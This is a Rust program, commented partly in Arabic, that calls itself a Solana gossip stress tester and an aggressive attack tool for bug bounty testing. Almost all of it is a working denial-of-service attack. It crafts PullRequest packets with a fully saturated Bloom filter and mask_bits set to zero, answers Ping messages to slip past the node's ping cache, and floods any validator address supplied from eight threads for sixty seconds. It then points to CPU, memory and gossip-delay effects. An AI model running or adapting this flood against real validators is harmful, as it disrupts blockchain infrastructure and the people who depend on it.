//! Solana Gossip Stress Test - Aggressive Node Endurance Tester
//! أداة هجوم شرسة لاختبار صمود العقدة

use std::{
    net::{SocketAddr, UdpSocket},
    sync::{Arc, atomic::{AtomicU64, AtomicBool, Ordering}},
    thread,
    time::{Duration, Instant},
};
use bincode;
use bitvec::prelude::*;
use serde::{Serialize, Deserialize};
use solana_sdk::{
    signature::{Keypair, Signer},
    pubkey::Pubkey,
};

// ═══════════════════════════════════════════════════════════
// STRUCT DEFINITIONS (Agave 4.0.0 compatible)
// ═══════════════════════════════════════════════════════════

#[derive(Serialize, Deserialize, Debug, Clone)]
struct Bloom { keys: Vec<u64>, bits: BitVec<u8>, num_bits_set: u64 }

#[derive(Serialize, Deserialize, Debug, Clone)]
struct CrdsFilter { filter: Bloom, mask: u64, mask_bits: u32 }

#[derive(Serialize, Deserialize, Debug, Clone)]
struct ContactInfo { pubkey: Pubkey, wallclock: u64, shred_version: u16 }

#[derive(Serialize, Deserialize, Debug, Clone)]
enum CrdsData { ContactInfo(ContactInfo) }

#[derive(Serialize, Deserialize, Debug, Clone)]
struct CrdsValue {
    data: CrdsData,
    #[serde(with = "serde_bytes")]
    signature: [u8; 64],
}

#[derive(Serialize, Deserialize, Debug, Clone)]
enum Protocol {
    PullRequest(CrdsFilter, CrdsValue),
    PullResponse(Pubkey, Vec<CrdsValue>),
    PingMessage(Ping),
    PongMessage(Pong),
}

#[derive(Serialize, Deserialize, Debug, Clone)]
struct Ping { from: Pubkey, token: [u8; 32], #[serde(with = "serde_bytes")] signature: [u8; 64] }

#[derive(Serialize, Deserialize, Debug, Clone)]
struct Pong { from: Pubkey, hash: [u8; 32], #[serde(with = "serde_bytes")] signature: [u8; 64] }

// ═══════════════════════════════════════════════════════════
// ATTACK CONFIGURATION
// ═══════════════════════════════════════════════════════════

const ATTACK_DURATION_SECS: u64 = 60;      // مدة الهجوم
const THREADS_COUNT: usize = 8;            // عدد الـ threads المهاجمة
const PACKETS_PER_BATCH: usize = 100;      // حزم لكل batch

// ═══════════════════════════════════════════════════════════
// FILTER BUILDERS
// ═══════════════════════════════════════════════════════════

fn build_malicious_filter() -> CrdsFilter {
    let keys: Vec<u64> = (0..63).map(|i| i as u64 + 1).collect();
    let mut bits = bitvec![u8, Lsb0; 0; 4032];
    for i in 0..4032 { bits.set(i, true); } // Fill rate 100%
    CrdsFilter { filter: Bloom { keys, bits, num_bits_set: 4032 }, mask: 0, mask_bits: 0 }
}

fn build_crds_value_signed(keypair: &Keypair, wallclock: u64, shred_version: u16) -> CrdsValue {
    let contact = ContactInfo { pubkey: keypair.pubkey(), wallclock, shred_version };
    let data_enum = CrdsData::ContactInfo(contact);
    let data_bytes = bincode::serialize(&data_enum).unwrap();
    let sig_bytes = keypair.sign_message(&data_bytes);
    let mut sig = [0u8; 64];
    sig.copy_from_slice(sig_bytes.as_ref());
    CrdsValue { data: data_enum, signature: sig }
}

// ═══════════════════════════════════════════════════════════
// PING/PONG HANDLER (لتجاوز PingCache)
// ═══════════════════════════════════════════════════════════

fn handle_ping_pong(socket: &UdpSocket, addr: SocketAddr, keypair: &Keypair) -> bool {
    let mut buf = [0u8; 65536];
    socket.set_read_timeout(Some(Duration::from_millis(500))).ok();
    
    // محاولة استقبال أي PingMessage من العقدة
    for _ in 0..5 {
        match socket.recv_from(&mut buf) {
            Ok((size, _)) => {
                if let Ok(Protocol::PingMessage(ping)) = bincode::deserialize::<Protocol>(&buf[..size]) {
                    // توقيع الـ hash باستخدام sha256 للـ token
                    use solana_sdk::hash::hash;
                    let hash_val = hash(&ping.token).to_bytes();
                    let sig_bytes2 = keypair.sign_message(&hash_val);
                    let mut sig = [0u8; 64];
                    sig.copy_from_slice(sig_bytes2.as_ref());
                    let pong = Pong { from: keypair.pubkey(), hash: hash_val, signature: sig };
                    let pong_pkt = bincode::serialize(&Protocol::PongMessage(pong)).unwrap();
                    socket.send_to(&pong_pkt, addr).ok();
                    println!("  ✓ Handled PingMessage, sent Pong response");
                    return true;
                }
            }
            Err(_) => break,
        }
    }
    false
}

// ═══════════════════════════════════════════════════════════
// ATTACK THREAD
// ═══════════════════════════════════════════════════════════

fn attack_thread(
    addr: SocketAddr,
    shred_ver: u16,
    stop_flag: Arc<AtomicBool>,
    sent_counter: Arc<AtomicU64>,
    thread_id: usize,
) {
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    let kp = Keypair::new();
    let malicious = build_malicious_filter();
    
    // تحضير حزمة واحدة وإعادة استخدامها (أسرع)
    let val = build_crds_value_signed(&kp, 1000 + thread_id as u64, shred_ver);
    let protocol = Protocol::PullRequest(malicious, val);
    let pkt = bincode::serialize(&protocol).unwrap();
    
    let mut batch_count = 0u64;
    
    while !stop_flag.load(Ordering::Relaxed) {
        // إرسال batch من الحزم بسرعة
        for _ in 0..PACKETS_PER_BATCH {
            if socket.send_to(&pkt, addr).is_ok() {
                sent_counter.fetch_add(1, Ordering::Relaxed);
            }
        }
        batch_count += 1;
        
        // محاولة التعامل مع Ping/Pong كل 1000 batch
        if batch_count % 1000 == 0 {
            handle_ping_pong(&socket, addr, &kp);
        }
    }
}

// ═══════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════

fn main() {
    println!("╔═══════════════════════════════════════════════════════════╗");
    println!("║  Solana Gossip Stress Test - Node Endurance Tester       ║");
    println!("║  Aggressive Attack Tool for Bug Bounty Testing           ║");
    println!("╚═══════════════════════════════════════════════════════════╝\n");

    let args: Vec<String> = std::env::args().collect();
    if args.len() < 3 {
        eprintln!("Usage: {} <validator_addr> <shred_version>", args[0]);
        eprintln!("Example: {} 127.0.0.1:8000 58305", args[0]);
        eprintln!("\nConfiguration:");
        eprintln!("  Attack duration: {} seconds", ATTACK_DURATION_SECS);
        eprintln!("  Threads: {}", THREADS_COUNT);
        eprintln!("  Packets per batch: {}", PACKETS_PER_BATCH);
        return;
    }
    
    let addr: SocketAddr = args[1].parse().unwrap();
    let shred_ver: u16 = args[2].parse().unwrap();
    
    println!("╔═══════════════════════════════════════════════════════════╗");
    println!("║ ATTACK CONFIGURATION                                      ║");
    println!("╠═══════════════════════════════════════════════════════════╣");
    println!("║ Target:           {:<38}║", format!("{}", addr));
    println!("║ Shred Version:    {:<38}║", shred_ver);
    println!("║ Duration:         {} seconds{:<27}║", ATTACK_DURATION_SECS, "");
    println!("║ Attack Threads:   {:<38}║", THREADS_COUNT);
    println!("║ Filter Type:      Malicious (mask_bits=0, fill=100%){:<4}║", "");
    println!("╚═══════════════════════════════════════════════════════════╝\n");

    let sent_counter = Arc::new(AtomicU64::new(0));
    let stop_flag = Arc::new(AtomicBool::new(false));
    
    // إطلاق threads الهجوم
    println!("[*] Launching {} attack threads...", THREADS_COUNT);
    let mut handles = Vec::new();
    
    for i in 0..THREADS_COUNT {
        let addr_clone = addr;
        let stop_clone = Arc::clone(&stop_flag);
        let counter_clone = Arc::clone(&sent_counter);
        
        let handle = thread::spawn(move || {
            attack_thread(addr_clone, shred_ver, stop_clone, counter_clone, i);
        });
        handles.push(handle);
        println!("  ✓ Thread {} launched", i);
    }

    // مراقبة الإحصائيات
    println!("\n[*] Attack started. Monitoring stats every 5 seconds...\n");
    let start_time = Instant::now();
    let mut last_count = 0u64;
    
    loop {
        let elapsed = start_time.elapsed().as_secs();
        if elapsed >= ATTACK_DURATION_SECS {
            break;
        }
        
        thread::sleep(Duration::from_secs(5));
        
        let current_count = sent_counter.load(Ordering::Relaxed);
        let delta = current_count - last_count;
        let rate = delta / 5;
        last_count = current_count;
        
        let remaining = ATTACK_DURATION_SECS - elapsed;
        
        println!("╔═══════════════════════════════════════════════════════════╗");
        println!("║ LIVE STATS                                                ║");
        println!("╠═══════════════════════════════════════════════════════════╣");
        println!("║ Elapsed:          {:<38}║", format!("{} / {} seconds", elapsed, ATTACK_DURATION_SECS));
        println!("║ Remaining:        {:<38}║", format!("{} seconds", remaining));
        println!("║ Total Sent:       {:<38}║", format!("{} packets", current_count));
        println!("║ Rate (5s avg):    {:<38}║", format!("{} pkt/s", rate));
        println!("║ Rate (total avg): {:<38}║", format!("{} pkt/s", current_count / elapsed.max(1)));
        println!("╚═══════════════════════════════════════════════════════════╝");
    }

    // إيقاف الهجوم
    println!("\n[*] Stopping attack...");
    stop_flag.store(true, Ordering::Relaxed);
    
    for handle in handles {
        handle.join().unwrap();
    }
    
    let final_count = sent_counter.load(Ordering::Relaxed);
    let total_time = start_time.elapsed().as_secs();
    
    println!("\n╔═══════════════════════════════════════════════════════════╗");
    println!("║ ATTACK SUMMARY                                            ║");
    println!("╠═══════════════════════════════════════════════════════════╣");
    println!("║ Total Duration:   {:<38}║", format!("{} seconds", total_time));
    println!("║ Total Packets:    {:<38}║", format!("{} packets", final_count));
    println!("║ Average Rate:     {:<38}║", format!("{} pkt/s", final_count / total_time.max(1)));
    println!("╚═══════════════════════════════════════════════════════════╝");
    
    println!("\n[*] Check validator logs for:");
    println!("    - CPU usage spikes");
    println!("    - Gossip processing delays");
    println!("    - Memory pressure");
    println!("    - Any error messages");
}